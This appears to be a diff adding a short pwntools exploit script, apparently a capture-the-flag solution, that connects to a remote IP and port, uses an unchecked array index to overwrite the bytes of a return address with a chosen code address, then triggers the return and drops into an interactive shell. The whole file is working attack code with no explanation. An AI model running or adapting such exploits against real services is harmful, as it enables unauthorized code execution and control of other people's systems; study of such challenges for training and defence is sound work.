@@ -1,0 +1,27 @@
+from pwn import *
+
+def change_addr(index, number):
+	io.send(b'3\n')
+	io.recv()
+	io.send(index)
+	io.recv()
+	io.send(number)
+	io.recv()
+
+# io = process('./pwn')
+io = remote('111.200.241.244', 53696)
+io.recv()
+io.send(b'200\n')
+io.recv()
+io.send(b'255\n' * 100)
+io.recv()
+change_addr(b'132\n', b'-76\n')
+change_addr(b'133\n', b'-123\n')
+change_addr(b'134\n', b'4\n')
+change_addr(b'135\n', b'8\n')
+change_addr(b'136\n', b'-121\n')
+change_addr(b'137\n', b'-119\n')
+change_addr(b'138\n', b'4\n')
+change_addr(b'139\n', b'8\n')
+io.send(b'5\n')
+io.interactive()
